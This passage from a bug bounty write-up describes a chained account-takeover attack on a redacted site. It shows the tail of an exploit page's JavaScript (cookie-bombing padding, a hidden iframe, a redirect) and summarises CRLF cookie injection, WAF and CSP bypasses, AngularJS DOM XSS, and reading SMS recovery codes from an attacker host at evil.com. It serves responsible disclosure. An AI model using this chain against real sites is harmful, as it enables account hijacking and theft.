ceserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasd;Domain=.redacted.com;Path=/setcookie");
 Iframe5.setAttribute(‘id’, ‘bomb4’);
 Iframe5.setAttribute(‘width’, ‘1px’);
 Iframe5.setAttribute(‘height’, ‘1px’);
 document.body.appendChild(Iframe5);
 
 }
setTimeout(function(){ window.location=”https://www.redacted.com/selfcookiexssvulnerablepage";},3000);
 
 
 </script>
 
</html>

So our final payload does:

Set evil redacted cookie through CRLF
Bypass WAF with double encoding
Bypass our evil redacted cookie overwrite with Denial of Service on redacted.redacted.com/setcookie with cookie bombing.
Bypass CSP script-src with angularjs DOM XSS.
Bypass CSP connect-src with redacted API
Bypass CSP External resources with Evil PNG.
Change the phone and get account takeover.
👟 Step by Step of how the exploit works 👟

From the victim's side.

The victim randomly got redirected to https://evil.com/poc.html (the exploit page).
Your cookies are now infected, like getting a malware.
After you come back to Redacted login, put Redacted account credentials
You should see some exploit messages showing up right after you login, because of your injected evil cookies doing weird things.
After your phone is changed, you can check if a new phone has been added (111) 111–1111 as the primary phone and verified (no notification shows up).

From the attacker side:

Go to the lost password, input the account email, select the SMS recovery method.
Read the SMS code at the last line of http://evil.com/sms.txt, put the 6 digits code on the page.
Set a new password
Account PWNED! 🔥

This ended up in a 5 figures bounty because it's on one of those programs that pay nice amounts when you demonstrate impact and are rarely vulnerable to easy XSS issues in the core of the app.

The whole process from getting the CRLF to making the Account Takeover with all bypasses took 3+ months between research, bypasses, exploit writing, and trying to join all pieces 📅 , hope you could appreciate the hard work 👨‍💻 and that you enjoyed the read. 📖

If you enjoyed the read, please left your thumbs up! :).

My social profiles:

https://hackerone.com/edduu
https://twitter.com/MasterSEC_AR
